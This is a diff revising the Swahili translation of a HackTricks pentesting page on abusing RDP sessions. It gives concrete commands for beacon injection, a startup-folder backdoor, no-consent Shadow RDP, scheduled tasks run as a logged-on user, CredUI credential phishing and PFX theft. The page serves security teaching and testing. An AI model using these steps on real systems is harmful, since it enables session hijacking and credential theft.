@@ -4,9 +4,9 @@
 
 ## RDP Process Injection
 
-Ikiwa **kikundi cha nje** kina **RDP access** kwa **kompyuta** yoyote katika domaini ya sasa, **mshambuliaji** anaweza **kuvunja usalama wa kompyuta hiyo na kumsubiri**.
+Ikiwa **external group** ina **RDP access** kwa **computer** yoyote katika **domain** ya sasa, **attacker** anaweza **ku-compromise computer** hiyo na kumsubiri.
 
-Mara mtumiaji huyo atakapofikia kupitia RDP, **mshambuliaji anaweza kuhamia katika kikao cha mtumiaji huyo** na kutumia vibaya ruhusa zake katika domaini ya nje.
+Mara mtumiaji huyo anapofikia kupitia RDP, **attacker** anaweza kufanya **pivot** hadi kwenye **session** ya mtumiaji huyo na kutumia vibaya **permissions** zake katika **external domain**.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,13 +30,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Angalia **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Angalia **njia nyingine za kuiba sessions kwa kutumia tools nyingine** [**kwenye ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Ikiwa mtumiaji anaingia kupitia **RDP into a machine** ambapo **attacker** **anamsubiri** kwake, the attacker ataweza **inject a beacon in the RDP session of the user** na ikiwa **victim mounted his drive** wakati akiingia kupitia RDP, **attacker could access it**.
+Mtumiaji akiingia kupitia **RDP kwenye machine** ambako **attacker** **anamngoja**, attacker ataweza **kuingiza beacon kwenye RDP session ya mtumiaji**, na ikiwa **victim alikuwa amemount drive yake** wakati wa kuingia kupitia RDP, **attacker angeweza kuifikia**.
 
-Katika kesi hii unaweza tu **compromise** the **victims** **original computer** kwa kuandika **backdoor** katika **statup folder**.
+Katika hali hii, ungeweza tu **ku-compromise** **computer ya awali ya victim** kwa kuandika **backdoor** kwenye **startup folder**.
 ```bash
 # Wait til someone logs in:
 net logons
@@ -70,19 +70,19 @@ beacon> upload C:\Payloads\pivot.exe
 ```
 ## Shadow RDP
 
-Ikiwa wewe ni **local admin** kwenye host ambapo mwathiriwa tayari ana **active RDP session**, unaweza kuwa na uwezo wa **view/control that desktop without stealing the password or dumping LSASS**.
+Ikiwa wewe ni **local admin** kwenye host ambayo victim tayari ana **active RDP session**, unaweza kuwa na uwezo wa **kuona/kudhibiti desktop hiyo bila kuiba password au kufanya dumping LSASS**.<sup>[[1]](#references)</sup>
 
-Hii inategemea sera ya **Remote Desktop Services shadowing** iliyohifadhiwa katika:
+Hii inategemea policy ya **Remote Desktop Services shadowing** iliyohifadhiwa kwenye:<sup>[[2]](#references)[[3]](#references)</sup>
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
 Thamani zinazovutia:
 
 - `0`: Imezimwa
-- `1`: `EnableInputNotify` (udhibiti, idhini ya mtumiaji inahitajika)
-- `2`: `EnableInputNoNotify` (udhibiti, **hakuna idhini ya mtumiaji**)
-- `3`: `EnableNoInputNotify` (kwa kuangalia tu, idhini ya mtumiaji inahitajika)
-- `4`: `EnableNoInputNoNotify` (kwa kuangalia tu, **hakuna idhini ya mtumiaji**)
+- `1`: `EnableInputNotify` (control, idhini ya mtumiaji inahitajika)
+- `2`: `EnableInputNoNotify` (control, **hakuna idhini ya mtumiaji**)
+- `3`: `EnableNoInputNotify` (kutazama pekee, idhini ya mtumiaji inahitajika)
+- `4`: `EnableNoInputNoNotify` (kutazama pekee, **hakuna idhini ya mtumiaji**)
 ```cmd
 :: Check the policy
 reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
@@ -94,24 +94,26 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Hii ni muhimu hasa wakati mtumiaji mwenye ruhusa aliyeunganishwa kupitia RDP ameacha desktop isiyofungwa, kikao cha KeePass, console ya MMC, kikao cha kivinjari, au admin shell wazi.
+Hii ni muhimu hasa wakati mtumiaji mwenye privileged aliyeunganishwa kupitia RDP ameacha desktop isiyofungwa, session ya KeePass, MMC console, session ya browser, au admin shell ikiwa wazi.
 
-## Scheduled Tasks Kama Mtumiaji Aliyeingia
+## Scheduled Tasks As Logged-On User
 
-Ikiwa wewe ni **local admin** na mtumiaji lengwa **yuko ameingia**, Task Scheduler inaweza kuanzisha code **kama mtumiaji huyo bila nywila yao**.
+Ikiwa wewe ni **local admin** na mtumiaji lengwa **kwa sasa ameingia**, Task Scheduler inaweza kuanzisha code **kama mtumiaji huyo bila nenosiri lake**.<sup>[[1]](#references)[[4]](#references)</sup>
+
+Hii hubadilisha session ya sasa ya victim ya kuingia kuwa primitive ya kutekeleza code:
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
 Notes:
 
-- Ikiwa mtumiaji **hajatoka kwenye mfumo**, Windows kwa kawaida inahitaji nenosiri ili kuunda task itakayomfanya itekelezwe kwa jina lao.
-- Ikiwa mtumiaji **ameingia kwenye mfumo**, task inaweza kutumia tena muktadha wa logon uliopo.
-- Hii ni njia ya vitendo ya kutekeleza vitendo vya GUI au kuzindua binaries ndani ya session ya mwathiriwa bila kugusa LSASS.
+- Ikiwa user **hajaingia**, Windows kwa kawaida huhitaji password ili kuunda task inayotekelezwa kama user huyo.
+- Ikiwa user **ameingia**, task inaweza kutumia tena logon context iliyopo.
+- Hii ni njia ya vitendo ya kutekeleza GUI actions au kuzindua binaries ndani ya victim session bila kugusa LSASS.
 
-## CredUI Prompt Abuse From the Victim Session
+## CredUI Prompt Abuse Kutoka Kwenye Victim Session
 
-Mara baada ya kuweza kutekeleza **ndani ya desktop ya mwingiliano ya mwathiriwa** (kwa mfano kupitia **Shadow RDP** au **a scheduled task running as that user**), unaweza kuonyesha **halali Windows credential prompt** kwa kutumia CredUI APIs na kukusanya credentials zilizoingizwa na mwathiriwa.
+Mara tu unapoweza kutekeleza **ndani ya interactive desktop ya victim** (kwa mfano kupitia **Shadow RDP** au **scheduled task inayoendeshwa kama user huyo**), unaweza kuonyesha **Windows credential prompt halisi** ukitumia CredUI APIs na kuvuna credentials zinazoingizwa na victim.<sup>[[1]](#references)</sup>
 
 Relevant APIs:
 
@@ -120,25 +122,25 @@ Relevant APIs:
 
 Typical flow:
 
-1. Spawn a binary in the victim session.
-2. Display a domain-authentication prompt that matches the current domain branding.
-3. Unpack the returned auth buffer.
-4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.
+1. Spawn binary katika victim session.
+2. Onyesha domain-authentication prompt inayolingana na domain branding ya sasa.
+3. Unpack auth buffer iliyorejeshwa.
+4. Validate credentials zilizotolewa na, kwa hiari, endelea kuonyesha prompt hadi credentials halali ziingizwe.
 
-Hii ni muhimu kwa **on-host phishing** kwa sababu prompt inaonyeshwa na Windows APIs za kawaida badala ya fomu ya HTML ya bandia.
+Hii ni muhimu kwa **on-host phishing** kwa sababu prompt inarenderiwa na standard Windows APIs badala ya fake HTML form.
 
-## Requesting a PFX In the Victim Context
+## Requesting a PFX Katika Victim Context
 
-The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.
+Primitive hiyo hiyo ya **scheduled-task-as-user** inaweza kutumika kuomba **certificate/PFX kama victim aliyeingia**. Certificate hiyo inaweza kutumiwa baadaye kwa **AD authentication** kama user huyo, hivyo kuepuka kabisa password theft.<sup>[[1]](#references)[[5]](#references)</sup>
 
 High-level flow:
 
-1. Gain **local admin** on a host where the victim is logged on.
-2. Run enrollment/export logic as the victim using a **scheduled task**.
-3. Export the resulting **PFX**.
-4. Use the PFX for PKINIT / certificate-based AD authentication.
+1. Pata **local admin** kwenye host ambayo victim ameingia.
+2. Endesha enrollment/export logic kama victim ukitumia **scheduled task**.
+3. Export **PFX** inayotokana.
+4. Tumia PFX kwa PKINIT / certificate-based AD authentication.
 
-See the AD CS pages for follow-up abuse:
+Tazama kurasa za AD CS kwa abuse inayofuata:
 
 {{#ref}}
 ad-certificates/account-persistence.md
@@ -146,10 +148,10 @@ ad-certificates/account-persistence.md
 
 ## References
 
-- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
-- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
-- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
-- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
-- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
+- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
+- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
+- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
+- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
+- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
 
 {{#include ../../banners/hacktricks-training.md}}
